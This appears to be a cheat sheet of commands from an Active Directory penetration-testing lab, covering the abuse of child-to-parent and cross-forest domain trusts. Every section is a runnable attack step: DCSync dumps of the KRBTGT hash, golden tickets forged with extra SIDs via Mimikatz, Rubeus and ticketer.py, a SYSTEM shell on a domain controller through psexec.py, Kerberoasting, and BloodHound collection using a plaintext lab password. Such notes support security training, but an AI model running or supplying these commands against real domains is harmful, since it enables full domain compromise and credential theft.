### **Enumerating Trust Relationships**
1. Using Get-ADTrust: `Get-ADTrust -Filter *`
2. Checking for Existing Trusts using Get-DomainTrust: `Get-DomainTrust `
3. Using Get-DomainTrustMapping: `Get-DomainTrustMapping`
4. Checking Users in the Child Domain using Get-DomainUser: `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName`
5. Using netdom to query domain trust: `netdom query /domain:inlanefreight.local trust`
6. Using netdom to query domain controllers: `netdom query /domain:inlanefreight.local dc`
7. Using netdom to query workstations and servers: `netdom query /domain:inlanefreight.local workstation`
### **ExtraSids Attack - Mimikatz**
1. Obtaining the KRBTGT Account's NT Hash using Mimikatz: `lsadump::dcsync /user:LOGISTICS\krbtgt`
2. Using Get-DomainSID: `Get-DomainSID`
3. Obtaining Enterprise Admins Group's SID using Get-DomainGroup: `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`
4. Creating a Golden Ticket with Mimikatz: `kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`
5. Confirming a Kerberos Ticket is in Memory Using klist: `klist`
6. Listing the Entire C: Drive of the Domain Controller: `ls \\academy-ea-dc01.inlanefreight.local\c$`
### **ExtraSids Attack - Rubeus**
1. Creating a Golden Ticket using Rubeus: ` .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`
2. `klist`
3. Performing a DCSync Attack: 
    1. `.\mimikatz.exe`
    2. `lsadump::dcsync /user:INLANEFREIGHT\lab_adm`
    3. `lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL`
### **Attacking Domain Trusts - Child -> Parent Trusts - from Linux**
1. Performing DCSync with secretsdump.py: `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`
2. Performing SID Brute Forcing using lookupsid.py: `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
3. lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID": `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
4. Constructing a Golden Ticket using ticketer.py: `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`
5. Setting the KRB5CCNAME Environment Variable: `export KRB5CCNAME=hacker.ccache `
6. Getting a SYSTEM shell using Impacket's psexec.py: `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`
7. Performing the Attack with raiseChild.py: `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`
### **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows**
1. Enumerating Accounts for Associated SPNs Using Get-DomainUser: `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName`
2. Enumerating the mssqlsvc Account: `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof`
3. Performing a Kerberoasting Attacking with Rubeus Using /domain Flag: `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`
4. Run the hash through Hashcat
### **Admin Password Re-Use & Group Membership**
1. Using Get-DomainForeignGroupMember: `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`
2. Convet SID to name: `Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500`
3. Accessing DC03 Using Enter-PSSession: ` Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator`
### **Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux**
1. Using GetUserSPNs.py: `GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
2. Using the -request Flag: `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
### **Hunting Foreign Group Membership with Bloodhound-python`
1. Running bloodhound-python Against INLANEFREIGHT.LOCAL: `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`
2. Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf: 
    1. `domain FREIGHTLOGISTICS.LOCAL`
    2. `nameserver 172.16.5.238`
3. Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL: `bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2`

